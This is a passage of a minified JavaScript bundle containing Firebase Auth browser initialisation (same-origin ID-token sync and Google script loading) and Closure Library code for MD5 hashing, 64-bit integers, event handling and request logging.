 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const D4=5*60,j4=W1("authIdTokenMaxAge")||D4;let Hw=null;const M4=t=>async e=>{const n=e&&await e.getIdTokenResult(),r=n&&(new Date().getTime()-Date.parse(n.issuedAtTime))/1e3;if(r&&r>j4)return;const i=n==null?void 0:n.token;Hw!==i&&(Hw=i,await fetch(t,{method:i?"POST":"DELETE",headers:i?{Authorization:`Bearer ${i}`}:{}}))};function L4(t=Th()){const e=fc(t,"auth");if(e.isInitialized())return e.getImmediate();const n=sL(t,{popupRedirectResolver:P4,persistence:[zL,kL,Ib]}),r=W1("authTokenSyncURL");if(r&&typeof isSecureContext=="boolean"&&isSecureContext){const s=new URL(r,location.origin);if(location.origin===s.origin){const o=M4(s.toString());SL(n,o,()=>o(n.currentUser)),CL(n,a=>o(a))}}const i=V1("auth");return i&&aL(n,`http://${i}`),n}function F4(){var t,e;return(e=(t=document.getElementsByTagName("head"))===null||t===void 0?void 0:t[0])!==null&&e!==void 0?e:document}XM({loadJS(t){return new Promise((e,n)=>{const r=document.createElement("script");r.setAttribute("src",t),r.onload=e,r.onerror=i=>{const s=tr("internal-error");s.customData=i,n(s)},r.type="text/javascript",r.charset="UTF-8",F4().appendChild(r)})},gapiScript:"https://apis.google.com/js/api.js",recaptchaV2Script:"https://www.google.com/recaptcha/api.js",recaptchaEnterpriseScript:"https://www.google.com/recaptcha/enterprise.js?render="});O4("Browser");var Ww=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};/** @license
Copyright The Closure Library Authors.
SPDX-License-Identifier: Apache-2.0
*/var Db;(function(){var t;/** @license

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/function e(T,b){function P(){}P.prototype=b.prototype,T.D=b.prototype,T.prototype=new P,T.prototype.constructor=T,T.C=function(k,O,D){for(var A=Array(arguments.length-2),V=2;V<arguments.length;V++)A[V-2]=arguments[V];return b.prototype[O].apply(k,A)}}function n(){this.blockSize=-1}function r(){this.blockSize=-1,this.blockSize=64,this.g=Array(4),this.B=Array(this.blockSize),this.o=this.h=0,this.s()}e(r,n),r.prototype.s=function(){this.g[0]=1732584193,this.g[1]=4023233417,this.g[2]=2562383102,this.g[3]=271733878,this.o=this.h=0};function i(T,b,P){P||(P=0);var k=Array(16);if(typeof b=="string")for(var O=0;16>O;++O)k[O]=b.charCodeAt(P++)|b.charCodeAt(P++)<<8|b.charCodeAt(P++)<<16|b.charCodeAt(P++)<<24;else for(O=0;16>O;++O)k[O]=b[P++]|b[P++]<<8|b[P++]<<16|b[P++]<<24;b=T.g[0],P=T.g[1],O=T.g[2];var D=T.g[3],A=b+(D^P&(O^D))+k[0]+3614090360&4294967295;b=P+(A<<7&4294967295|A>>>25),A=D+(O^b&(P^O))+k[1]+3905402710&4294967295,D=b+(A<<12&4294967295|A>>>20),A=O+(P^D&(b^P))+k[2]+606105819&4294967295,O=D+(A<<17&4294967295|A>>>15),A=P+(b^O&(D^b))+k[3]+3250441966&4294967295,P=O+(A<<22&4294967295|A>>>10),A=b+(D^P&(O^D))+k[4]+4118548399&4294967295,b=P+(A<<7&4294967295|A>>>25),A=D+(O^b&(P^O))+k[5]+1200080426&4294967295,D=b+(A<<12&4294967295|A>>>20),A=O+(P^D&(b^P))+k[6]+2821735955&4294967295,O=D+(A<<17&4294967295|A>>>15),A=P+(b^O&(D^b))+k[7]+4249261313&4294967295,P=O+(A<<22&4294967295|A>>>10),A=b+(D^P&(O^D))+k[8]+1770035416&4294967295,b=P+(A<<7&4294967295|A>>>25),A=D+(O^b&(P^O))+k[9]+2336552879&4294967295,D=b+(A<<12&4294967295|A>>>20),A=O+(P^D&(b^P))+k[10]+4294925233&4294967295,O=D+(A<<17&4294967295|A>>>15),A=P+(b^O&(D^b))+k[11]+2304563134&4294967295,P=O+(A<<22&4294967295|A>>>10),A=b+(D^P&(O^D))+k[12]+1804603682&4294967295,b=P+(A<<7&4294967295|A>>>25),A=D+(O^b&(P^O))+k[13]+4254626195&4294967295,D=b+(A<<12&4294967295|A>>>20),A=O+(P^D&(b^P))+k[14]+2792965006&4294967295,O=D+(A<<17&4294967295|A>>>15),A=P+(b^O&(D^b))+k[15]+1236535329&4294967295,P=O+(A<<22&4294967295|A>>>10),A=b+(O^D&(P^O))+k[1]+4129170786&4294967295,b=P+(A<<5&4294967295|A>>>27),A=D+(P^O&(b^P))+k[6]+3225465664&4294967295,D=b+(A<<9&4294967295|A>>>23),A=O+(b^P&(D^b))+k[11]+643717713&4294967295,O=D+(A<<14&4294967295|A>>>18),A=P+(D^b&(O^D))+k[0]+3921069994&4294967295,P=O+(A<<20&4294967295|A>>>12),A=b+(O^D&(P^O))+k[5]+3593408605&4294967295,b=P+(A<<5&4294967295|A>>>27),A=D+(P^O&(b^P))+k[10]+38016083&4294967295,D=b+(A<<9&4294967295|A>>>23),A=O+(b^P&(D^b))+k[15]+3634488961&4294967295,O=D+(A<<14&4294967295|A>>>18),A=P+(D^b&(O^D))+k[4]+3889429448&4294967295,P=O+(A<<20&4294967295|A>>>12),A=b+(O^D&(P^O))+k[9]+568446438&4294967295,b=P+(A<<5&4294967295|A>>>27),A=D+(P^O&(b^P))+k[14]+3275163606&4294967295,D=b+(A<<9&4294967295|A>>>23),A=O+(b^P&(D^b))+k[3]+4107603335&4294967295,O=D+(A<<14&4294967295|A>>>18),A=P+(D^b&(O^D))+k[8]+1163531501&4294967295,P=O+(A<<20&4294967295|A>>>12),A=b+(O^D&(P^O))+k[13]+2850285829&4294967295,b=P+(A<<5&4294967295|A>>>27),A=D+(P^O&(b^P))+k[2]+4243563512&4294967295,D=b+(A<<9&4294967295|A>>>23),A=O+(b^P&(D^b))+k[7]+1735328473&4294967295,O=D+(A<<14&4294967295|A>>>18),A=P+(D^b&(O^D))+k[12]+2368359562&4294967295,P=O+(A<<20&4294967295|A>>>12),A=b+(P^O^D)+k[5]+4294588738&4294967295,b=P+(A<<4&4294967295|A>>>28),A=D+(b^P^O)+k[8]+2272392833&4294967295,D=b+(A<<11&4294967295|A>>>21),A=O+(D^b^P)+k[11]+1839030562&4294967295,O=D+(A<<16&4294967295|A>>>16),A=P+(O^D^b)+k[14]+4259657740&4294967295,P=O+(A<<23&4294967295|A>>>9),A=b+(P^O^D)+k[1]+2763975236&4294967295,b=P+(A<<4&4294967295|A>>>28),A=D+(b^P^O)+k[4]+1272893353&4294967295,D=b+(A<<11&4294967295|A>>>21),A=O+(D^b^P)+k[7]+4139469664&4294967295,O=D+(A<<16&4294967295|A>>>16),A=P+(O^D^b)+k[10]+3200236656&4294967295,P=O+(A<<23&4294967295|A>>>9),A=b+(P^O^D)+k[13]+681279174&4294967295,b=P+(A<<4&4294967295|A>>>28),A=D+(b^P^O)+k[0]+3936430074&4294967295,D=b+(A<<11&4294967295|A>>>21),A=O+(D^b^P)+k[3]+3572445317&4294967295,O=D+(A<<16&4294967295|A>>>16),A=P+(O^D^b)+k[6]+76029189&4294967295,P=O+(A<<23&4294967295|A>>>9),A=b+(P^O^D)+k[9]+3654602809&4294967295,b=P+(A<<4&4294967295|A>>>28),A=D+(b^P^O)+k[12]+3873151461&4294967295,D=b+(A<<11&4294967295|A>>>21),A=O+(D^b^P)+k[15]+530742520&4294967295,O=D+(A<<16&4294967295|A>>>16),A=P+(O^D^b)+k[2]+3299628645&4294967295,P=O+(A<<23&4294967295|A>>>9),A=b+(O^(P|~D))+k[0]+4096336452&4294967295,b=P+(A<<6&4294967295|A>>>26),A=D+(P^(b|~O))+k[7]+1126891415&4294967295,D=b+(A<<10&4294967295|A>>>22),A=O+(b^(D|~P))+k[14]+2878612391&4294967295,O=D+(A<<15&4294967295|A>>>17),A=P+(D^(O|~b))+k[5]+4237533241&4294967295,P=O+(A<<21&4294967295|A>>>11),A=b+(O^(P|~D))+k[12]+1700485571&4294967295,b=P+(A<<6&4294967295|A>>>26),A=D+(P^(b|~O))+k[3]+2399980690&4294967295,D=b+(A<<10&4294967295|A>>>22),A=O+(b^(D|~P))+k[10]+4293915773&4294967295,O=D+(A<<15&4294967295|A>>>17),A=P+(D^(O|~b))+k[1]+2240044497&4294967295,P=O+(A<<21&4294967295|A>>>11),A=b+(O^(P|~D))+k[8]+1873313359&4294967295,b=P+(A<<6&4294967295|A>>>26),A=D+(P^(b|~O))+k[15]+4264355552&4294967295,D=b+(A<<10&4294967295|A>>>22),A=O+(b^(D|~P))+k[6]+2734768916&4294967295,O=D+(A<<15&4294967295|A>>>17),A=P+(D^(O|~b))+k[13]+1309151649&4294967295,P=O+(A<<21&4294967295|A>>>11),A=b+(O^(P|~D))+k[4]+4149444226&4294967295,b=P+(A<<6&4294967295|A>>>26),A=D+(P^(b|~O))+k[11]+3174756917&4294967295,D=b+(A<<10&4294967295|A>>>22),A=O+(b^(D|~P))+k[2]+718787259&4294967295,O=D+(A<<15&4294967295|A>>>17),A=P+(D^(O|~b))+k[9]+3951481745&4294967295,T.g[0]=T.g[0]+b&4294967295,T.g[1]=T.g[1]+(O+(A<<21&4294967295|A>>>11))&4294967295,T.g[2]=T.g[2]+O&4294967295,T.g[3]=T.g[3]+D&4294967295}r.prototype.u=function(T,b){b===void 0&&(b=T.length);for(var P=b-this.blockSize,k=this.B,O=this.h,D=0;D<b;){if(O==0)for(;D<=P;)i(this,T,D),D+=this.blockSize;if(typeof T=="string"){for(;D<b;)if(k[O++]=T.charCodeAt(D++),O==this.blockSize){i(this,k),O=0;break}}else for(;D<b;)if(k[O++]=T[D++],O==this.blockSize){i(this,k),O=0;break}}this.h=O,this.o+=b},r.prototype.v=function(){var T=Array((56>this.h?this.blockSize:2*this.blockSize)-this.h);T[0]=128;for(var b=1;b<T.length-8;++b)T[b]=0;var P=8*this.o;for(b=T.length-8;b<T.length;++b)T[b]=P&255,P/=256;for(this.u(T),T=Array(16),b=P=0;4>b;++b)for(var k=0;32>k;k+=8)T[P++]=this.g[b]>>>k&255;return T};function s(T,b){var P=a;return Object.prototype.hasOwnProperty.call(P,T)?P[T]:P[T]=b(T)}function o(T,b){this.h=b;for(var P=[],k=!0,O=T.length-1;0<=O;O--){var D=T[O]|0;k&&D==b||(P[O]=D,k=!1)}this.g=P}var a={};function c(T){return-128<=T&&128>T?s(T,function(b){return new o([b|0],0>b?-1:0)}):new o([T|0],0>T?-1:0)}function u(T){if(isNaN(T)||!isFinite(T))return f;if(0>T)return C(u(-T));for(var b=[],P=1,k=0;T>=P;k++)b[k]=T/P|0,P*=4294967296;return new o(b,0)}function p(T,b){if(T.length==0)throw Error("number format error: empty string");if(b=b||10,2>b||36<b)throw Error("radix out of range: "+b);if(T.charAt(0)=="-")return C(p(T.substring(1),b));if(0<=T.indexOf("-"))throw Error('number format error: interior "-" character');for(var P=u(Math.pow(b,8)),k=f,O=0;O<T.length;O+=8){var D=Math.min(8,T.length-O),A=parseInt(T.substring(O,O+D),b);8>D?(D=u(Math.pow(b,D)),k=k.j(D).add(u(A))):(k=k.j(P),k=k.add(u(A)))}return k}var f=c(0),h=c(1),E=c(16777216);t=o.prototype,t.m=function(){if(y(this))return-C(this).m();for(var T=0,b=1,P=0;P<this.g.length;P++){var k=this.i(P);T+=(0<=k?k:4294967296+k)*b,b*=4294967296}return T},t.toString=function(T){if(T=T||10,2>T||36<T)throw Error("radix out of range: "+T);if(_(this))return"0";if(y(this))return"-"+C(this).toString(T);for(var b=u(Math.pow(T,6)),P=this,k="";;){var O=N(P,b).g;P=x(P,O.j(b));var D=((0<P.g.length?P.g[0]:P.h)>>>0).toString(T);if(P=O,_(P))return D+k;for(;6>D.length;)D="0"+D;k=D+k}},t.i=function(T){return 0>T?0:T<this.g.length?this.g[T]:this.h};function _(T){if(T.h!=0)return!1;for(var b=0;b<T.g.length;b++)if(T.g[b]!=0)return!1;return!0}function y(T){return T.h==-1}t.l=function(T){return T=x(this,T),y(T)?-1:_(T)?0:1};function C(T){for(var b=T.g.length,P=[],k=0;k<b;k++)P[k]=~T.g[k];return new o(P,~T.h).add(h)}t.abs=function(){return y(this)?C(this):this},t.add=function(T){for(var b=Math.max(this.g.length,T.g.length),P=[],k=0,O=0;O<=b;O++){var D=k+(this.i(O)&65535)+(T.i(O)&65535),A=(D>>>16)+(this.i(O)>>>16)+(T.i(O)>>>16);k=A>>>16,D&=65535,A&=65535,P[O]=A<<16|D}return new o(P,P[P.length-1]&-2147483648?-1:0)};function x(T,b){return T.add(C(b))}t.j=function(T){if(_(this)||_(T))return f;if(y(this))return y(T)?C(this).j(C(T)):C(C(this).j(T));if(y(T))return C(this.j(C(T)));if(0>this.l(E)&&0>T.l(E))return u(this.m()*T.m());for(var b=this.g.length+T.g.length,P=[],k=0;k<2*b;k++)P[k]=0;for(k=0;k<this.g.length;k++)for(var O=0;O<T.g.length;O++){var D=this.i(k)>>>16,A=this.i(k)&65535,V=T.i(O)>>>16,Z=T.i(O)&65535;P[2*k+2*O]+=A*Z,w(P,2*k+2*O),P[2*k+2*O+1]+=D*Z,w(P,2*k+2*O+1),P[2*k+2*O+1]+=A*V,w(P,2*k+2*O+1),P[2*k+2*O+2]+=D*V,w(P,2*k+2*O+2)}for(k=0;k<b;k++)P[k]=P[2*k+1]<<16|P[2*k];for(k=b;k<2*b;k++)P[k]=0;return new o(P,0)};function w(T,b){for(;(T[b]&65535)!=T[b];)T[b+1]+=T[b]>>>16,T[b]&=65535,b++}function S(T,b){this.g=T,this.h=b}function N(T,b){if(_(b))throw Error("division by zero");if(_(T))return new S(f,f);if(y(T))return b=N(C(T),b),new S(C(b.g),C(b.h));if(y(b))return b=N(T,C(b)),new S(C(b.g),b.h);if(30<T.g.length){if(y(T)||y(b))throw Error("slowDivide_ only works with positive integers.");for(var P=h,k=b;0>=k.l(T);)P=R(P),k=R(k);var O=j(P,1),D=j(k,1);for(k=j(k,2),P=j(P,2);!_(k);){var A=D.add(k);0>=A.l(T)&&(O=O.add(P),D=A),k=j(k,1),P=j(P,1)}return b=x(T,O.j(b)),new S(O,b)}for(O=f;0<=T.l(b);){for(P=Math.max(1,Math.floor(T.m()/b.m())),k=Math.ceil(Math.log(P)/Math.LN2),k=48>=k?1:Math.pow(2,k-48),D=u(P),A=D.j(b);y(A)||0<A.l(T);)P-=k,D=u(P),A=D.j(b);_(D)&&(D=h),O=O.add(D),T=x(T,A)}return new S(O,T)}t.A=function(T){return N(this,T).h},t.and=function(T){for(var b=Math.max(this.g.length,T.g.length),P=[],k=0;k<b;k++)P[k]=this.i(k)&T.i(k);return new o(P,this.h&T.h)},t.or=function(T){for(var b=Math.max(this.g.length,T.g.length),P=[],k=0;k<b;k++)P[k]=this.i(k)|T.i(k);return new o(P,this.h|T.h)},t.xor=function(T){for(var b=Math.max(this.g.length,T.g.length),P=[],k=0;k<b;k++)P[k]=this.i(k)^T.i(k);return new o(P,this.h^T.h)};function R(T){for(var b=T.g.length+1,P=[],k=0;k<b;k++)P[k]=T.i(k)<<1|T.i(k-1)>>>31;return new o(P,T.h)}function j(T,b){var P=b>>5;b%=32;for(var k=T.g.length-P,O=[],D=0;D<k;D++)O[D]=0<b?T.i(D+P)>>>b|T.i(D+P+1)<<32-b:T.i(D+P);return new o(O,T.h)}r.prototype.digest=r.prototype.v,r.prototype.reset=r.prototype.s,r.prototype.update=r.prototype.u,o.prototype.add=o.prototype.add,o.prototype.multiply=o.prototype.j,o.prototype.modulo=o.prototype.A,o.prototype.compare=o.prototype.l,o.prototype.toNumber=o.prototype.m,o.prototype.toString=o.prototype.toString,o.prototype.getBits=o.prototype.i,o.fromNumber=u,o.fromString=p,Db=o}).apply(typeof Ww<"u"?Ww:typeof self<"u"?self:typeof window<"u"?window:{});var du=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};(function(){var t,e=typeof Object.defineProperties=="function"?Object.defineProperty:function(l,m,g){return l==Array.prototype||l==Object.prototype||(l[m]=g.value),l};function n(l){l=[typeof globalThis=="object"&&globalThis,l,typeof window=="object"&&window,typeof self=="object"&&self,typeof du=="object"&&du];for(var m=0;m<l.length;++m){var g=l[m];if(g&&g.Math==Math)return g}throw Error("Cannot find global object")}var r=n(this);function i(l,m){if(m)e:{var g=r;l=l.split(".");for(var I=0;I<l.length-1;I++){var M=l[I];if(!(M in g))break e;g=g[M]}l=l[l.length-1],I=g[l],m=m(I),m!=I&&m!=null&&e(g,l,{configurable:!0,writable:!0,value:m})}}function s(l,m){l instanceof String&&(l+="");var g=0,I=!1,M={next:function(){if(!I&&g<l.length){var F=g++;return{value:m(F,l[F]),done:!1}}return I=!0,{done:!0,value:void 0}}};return M[Symbol.iterator]=function(){return M},M}i("Array.prototype.values",function(l){return l||function(){return s(this,function(m,g){return g})}});/** @license

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/var o=o||{},a=this||self;function c(l){var m=typeof l;return m=m!="object"?m:l?Array.isArray(l)?"array":m:"null",m=="array"||m=="object"&&typeof l.length=="number"}function u(l){var m=typeof l;return m=="object"&&l!=null||m=="function"}function p(l,m,g){return l.call.apply(l.bind,arguments)}function f(l,m,g){if(!l)throw Error();if(2<arguments.length){var I=Array.prototype.slice.call(arguments,2);return function(){var M=Array.prototype.slice.call(arguments);return Array.prototype.unshift.apply(M,I),l.apply(m,M)}}return function(){return l.apply(m,arguments)}}function h(l,m,g){return h=Function.prototype.bind&&Function.prototype.bind.toString().indexOf("native code")!=-1?p:f,h.apply(null,arguments)}function E(l,m){var g=Array.prototype.slice.call(arguments,1);return function(){var I=g.slice();return I.push.apply(I,arguments),l.apply(this,I)}}function _(l,m){function g(){}g.prototype=m.prototype,l.aa=m.prototype,l.prototype=new g,l.prototype.constructor=l,l.Qb=function(I,M,F){for(var W=Array(arguments.length-2),be=2;be<arguments.length;be++)W[be-2]=arguments[be];return m.prototype[M].apply(I,W)}}function y(l){const m=l.length;if(0<m){const g=Array(m);for(let I=0;I<m;I++)g[I]=l[I];return g}return[]}function C(l,m){for(let g=1;g<arguments.length;g++){const I=arguments[g];if(c(I)){const M=l.length||0,F=I.length||0;l.length=M+F;for(let W=0;W<F;W++)l[M+W]=I[W]}else l.push(I)}}class x{constructor(m,g){this.i=m,this.j=g,this.h=0,this.g=null}get(){let m;return 0<this.h?(this.h--,m=this.g,this.g=m.next,m.next=null):m=this.i(),m}}function w(l){return/^[\s\xa0]*$/.test(l)}function S(){var l=a.navigator;return l&&(l=l.userAgent)?l:""}function N(l){return N[" "](l),l}N[" "]=function(){};var R=S().indexOf("Gecko")!=-1&&!(S().toLowerCase().indexOf("webkit")!=-1&&S().indexOf("Edge")==-1)&&!(S().indexOf("Trident")!=-1||S().indexOf("MSIE")!=-1)&&S().indexOf("Edge")==-1;function j(l,m,g){for(const I in l)m.call(g,l[I],I,l)}function T(l,m){for(const g in l)m.call(void 0,l[g],g,l)}function b(l){const m={};for(const g in l)m[g]=l[g];return m}const P="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function k(l,m){let g,I;for(let M=1;M<arguments.length;M++){I=arguments[M];for(g in I)l[g]=I[g];for(let F=0;F<P.length;F++)g=P[F],Object.prototype.hasOwnProperty.call(I,g)&&(l[g]=I[g])}}function O(l){var m=1;l=l.split(":");const g=[];for(;0<m&&l.length;)g.push(l.shift()),m--;return l.length&&g.push(l.join(":")),g}function D(l){a.setTimeout(()=>{throw l},0)}function A(){var l=z;let m=null;return l.g&&(m=l.g,l.g=l.g.next,l.g||(l.h=null),m.next=null),m}class V{constructor(){this.h=this.g=null}add(m,g){const I=Z.get();I.set(m,g),this.h?this.h.next=I:this.g=I,this.h=I}}var Z=new x(()=>new q,l=>l.reset());class q{constructor(){this.next=this.g=this.h=null}set(m,g){this.h=m,this.g=g,this.next=null}reset(){this.next=this.g=this.h=null}}let J,L=!1,z=new V,Y=()=>{const l=a.Promise.resolve(void 0);J=()=>{l.then(K)}};var K=()=>{for(var l;l=A();){try{l.h.call(l.g)}catch(g){D(g)}var m=Z;m.j(l),100>m.h&&(m.h++,l.next=m.g,m.g=l)}L=!1};function Q(){this.s=this.s,this.C=this.C}Q.prototype.s=!1,Q.prototype.ma=function(){this.s||(this.s=!0,this.N())},Q.prototype.N=function(){if(this.C)for(;this.C.length;)this.C.shift()()};function X(l,m){this.type=l,this.g=this.target=m,this.defaultPrevented=!1}X.prototype.h=function(){this.defaultPrevented=!0};var Re=function(){if(!a.addEventListener||!Object.defineProperty)return!1;var l=!1,m=Object.defineProperty({},"passive",{get:function(){l=!0}});try{const g=()=>{};a.addEventListener("test",g,m),a.removeEventListener("test",g,m)}catch{}return l}();function Je(l,m){if(X.call(this,l?l.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,l){var g=this.type=l.type,I=l.changedTouches&&l.changedTouches.length?l.changedTouches[0]:null;if(this.target=l.target||l.srcElement,this.g=m,m=l.relatedTarget){if(R){e:{try{N(m.nodeName);var M=!0;break e}catch{}M=!1}M||(m=null)}}else g=="mouseover"?m=l.fromElement:g=="mouseout"&&(m=l.toElement);this.relatedTarget=m,I?(this.clientX=I.clientX!==void 0?I.clientX:I.pageX,this.clientY=I.clientY!==void 0?I.clientY:I.pageY,this.screenX=I.screenX||0,this.screenY=I.screenY||0):(this.clientX=l.clientX!==void 0?l.clientX:l.pageX,this.clientY=l.clientY!==void 0?l.clientY:l.pageY,this.screenX=l.screenX||0,this.screenY=l.screenY||0),this.button=l.button,this.key=l.key||"",this.ctrlKey=l.ctrlKey,this.altKey=l.altKey,this.shiftKey=l.shiftKey,this.metaKey=l.metaKey,this.pointerId=l.pointerId||0,this.pointerType=typeof l.pointerType=="string"?l.pointerType:ye[l.pointerType]||"",this.state=l.state,this.i=l,l.defaultPrevented&&Je.aa.h.call(this)}}_(Je,X);var ye={2:"touch",3:"pen",4:"mouse"};Je.prototype.h=function(){Je.aa.h.call(this);var l=this.i;l.preventDefault?l.preventDefault():l.returnValue=!1};var pt="closure_listenable_"+(1e6*Math.random()|0),zn=0;function Bn(l,m,g,I,M){this.listener=l,this.proxy=null,this.src=m,this.type=g,this.capture=!!I,this.ha=M,this.key=++zn,this.da=this.fa=!1}function Gt(l){l.da=!0,l.listener=null,l.proxy=null,l.src=null,l.ha=null}function cr(l){this.src=l,this.g={},this.h=0}cr.prototype.add=function(l,m,g,I,M){var F=l.toString();l=this.g[F],l||(l=this.g[F]=[],this.h++);var W=_n(l,m,I,M);return-1<W?(m=l[W],g||(m.fa=!1)):(m=new Bn(m,this.src,F,!!I,M),m.fa=g,l.push(m)),m};function Vn(l,m){var g=m.type;if(g in l.g){var I=l.g[g],M=Array.prototype.indexOf.call(I,m,void 0),F;(F=0<=M)&&Array.prototype.splice.call(I,M,1),F&&(Gt(m),l.g[g].length==0&&(delete l.g[g],l.h--))}}function _n(l,m,g,I){for(var M=0;M<l.length;++M){var F=l[M];if(!F.da&&F.listener==m&&F.capture==!!g&&F.ha==I)return M}return-1}var ur="closure_lm_"+(1e6*Math.random()|0),Ur={};function wn(l,m,g,I,M){if(Array.isArray(m)){for(var F=0;F<m.length;F++)wn(l,m[F],g,I,M);return null}return g=ya(g),l&&l[pt]?l.K(m,g,u(I)?!!I.capture:!!I,M):ma(l,m,g,!1,I,M)}function ma(l,m,g,I,M,F){if(!m)throw Error("Invalid event type");var W=u(M)?!!M.capture:!!M,be=$r(l);if(be||(l[ur]=be=new cr(l)),g=be.add(m,g,I,W,F),g.proxy)return g;if(I=ga(),g.proxy=I,I.src=l,I.listener=g,l.addEventListener)Re||(M=W),M===void 0&&(M=!1),l.addEventListener(m.toString(),I,M);else if(l.attachEvent)l.attachEvent(Nc(m.toString()),I);else if(l.addListener&&l.removeListener)l.addListener(I);else throw Error("addEventListener and attachEvent are unavailable.");return g}function ga(){function l(g){return m.call(l.src,l.listener,g)}const m=nf;return l}function qe(l,m,g,I,M){if(Array.isArray(m))for(var F=0;F<m.length;F++)qe(l,m[F],g,I,M);else I=u(I)?!!I.capture:!!I,g=ya(g),l&&l[pt]?(l=l.i,m=String(m).toString(),m in l.g&&(F=l.g[m],g=_n(F,g,I,M),-1<g&&(Gt(F[g]),Array.prototype.splice.call(F,g,1),F.length==0&&(delete l.g[m],l.h--)))):l&&(l=$r(l))&&(m=l.g[m.toString()],l=-1,m&&(l=_n(m,g,I,M)),(g=-1<l?m[l]:null)&&Hn(g))}function Hn(l){if(typeof l!="number"&&l&&!l.da){var m=l.src;if(m&&m[pt])Vn(m.i,l);else{var g=l.type,I=l.proxy;m.removeEventListener?m.removeEventListener(g,I,l.capture):m.detachEvent?m.detachEvent(Nc(g),I):m.addListener&&m.removeListener&&m.removeListener(I),(g=$r(m))?(Vn(g,l),g.h==0&&(g.src=null,m[ur]=null)):Gt(l)}}}function Nc(l){return l in Ur?Ur[l]:Ur[l]="on"+l}function nf(l,m){if(l.da)l=!0;else{m=new Je(m,this);var g=l.listener,I=l.ha||l.src;l.fa&&Hn(l),l=g.call(I,m)}return l}function $r(l){return l=l[ur],l instanceof cr?l:null}var va="__closure_events_fn_"+(1e9*Math.random()>>>0);function ya(l){return typeof l=="function"?l:(l[va]||(l[va]=function(m){return l.handleEvent(m)}),l[va])}function Ye(){Q.call(this),this.i=new cr(this),this.M=this,this.F=null}_(Ye,Q),Ye.prototype[pt]=!0,Ye.prototype.removeEventListener=function(l,m,g,I){qe(this,l,m,g,I)};function $e(l,m){var g,I=l.F;if(I)for(g=[];I;I=I.F)g.push(I);if(l=l.M,I=m.type||m,typeof m=="string")m=new X(m,l);else if(m instanceof X)m.target=m.target||l;else{var M=m;m=new X(I,l),k(m,M)}if(M=!0,g)for(var F=g.length-1;0<=F;F--){var W=m.g=g[F];M=Zi(W,I,!0,m)&&M}if(W=m.g=l,M=Zi(W,I,!0,m)&&M,M=Zi(W,I,!1,m)&&M,g)for(F=0;F<g.length;F++)W=m.g=g[F],M=Zi(W,I,!1,m)&&M}Ye.prototype.N=function(){if(Ye.aa.N.call(this),this.i){var l=this.i,m;for(m in l.g){for(var g=l.g[m],I=0;I<g.length;I++)Gt(g[I]);delete l.g[m],l.h--}}this.F=null},Ye.prototype.K=function(l,m,g,I){return this.i.add(String(l),m,!1,g,I)},Ye.prototype.L=function(l,m,g,I){return this.i.add(String(l),m,!0,g,I)};function Zi(l,m,g,I){if(m=l.i.g[String(m)],!m)return!0;m=m.concat();for(var M=!0,F=0;F<m.length;++F){var W=m[F];if(W&&!W.da&&W.capture==g){var be=W.listener,at=W.ha||W.src;W.fa&&Vn(l.i,W),M=be.call(at,I)!==!1&&M}}return M&&!I.defaultPrevented}function dr(l,m,g){if(typeof l=="function")g&&(l=h(l,g));else if(l&&typeof l.handleEvent=="function")l=h(l.handleEvent,l);else throw Error("Invalid listener argument");return 2147483647<Number(m)?-1:a.setTimeout(l,m||0)}function _a(l){l.g=dr(()=>{l.g=null,l.i&&(l.i=!1,_a(l))},l.l);const m=l.h;l.h=null,l.m.apply(null,m)}class rf extends Q{constructor(m,g){super(),this.m=m,this.l=g,this.h=null,this.i=!1,this.g=null}j(m){this.h=arguments,this.g?this.i=!0:_a(this)}N(){super.N(),this.g&&(a.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function zr(l){Q.call(this),this.h=l,this.g={}}_(zr,Q);var wa=[];function kc(l){j(l.g,function(m,g){this.g.hasOwnProperty(g)&&Hn(m)},l),l.g={}}zr.prototype.N=function(){zr.aa.N.call(this),kc(this)},zr.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")};var es=a.JSON.stringify,Wn=a.JSON.parse,sf=class{stringify(l){return a.JSON.stringify(l,void 0)}parse(l){return a.JSON.parse(l,void 0)}};function ne(){}ne.prototype.h=null;function Ee(l){return l.h||(l.h=l.i())}function Ce(){}var mt={OPEN:"a",kb:"b",Ja:"c",wb:"d"};function Mt(){X.call(this,"d")}_(Mt,X);function Br(){X.call(this,"c")}_(Br,X);var Vr={},Ky=null;function of(){return Ky=Ky||new Ye}Vr.La="serverreachability";function Gy(l){X.call(this,Vr.La,l)}_(Gy,X);function xa(l){const m=of();$e(m,new Gy(m))}Vr.STAT_EVENT="statevent";function qy(l,m){X.call(this,Vr.STAT_EVENT,l),this.stat=m}_(qy,X);function bt(l){const m=of();$e(m,new qy(m,l))}Vr.Ma="timingevent";function Yy(l,m){X.call(this,Vr.Ma,l),this.size=m}_(Yy,X);function Ea(l,m){if(typeof l!="function")throw Error("Fn must not be null and must be a function");return a.setTimeout(function(){l()},m)}function Ca(){this.g=!0}Ca.prototype.xa=function(){this.g=!1};function ok(l,m,g,I,M,F){l.info(function(){if(l.g)if(F)for(var W="",be=F.split("&"),at=0;at<be.length;at++){var ge=be[at].split("=");if(1<ge.length){var gt=ge[0];ge=ge[1];var vt=gt.split("_");W=2<=vt.length&&vt[1]=="type"?W+(gt+"="+ge+"&"):W+(gt+"=redacted&")}}else W=null;else W=F;return"XMLHTTP REQ ("+I+") [attempt "+M+"]: "+m+`
`+g+`
`+W})}function ak(l,m,g,I,M,F,W){l.info(function(){return"XMLHTTP RESP ("+I+") [ attempt "+M+"]: "+m+`
`+g+`
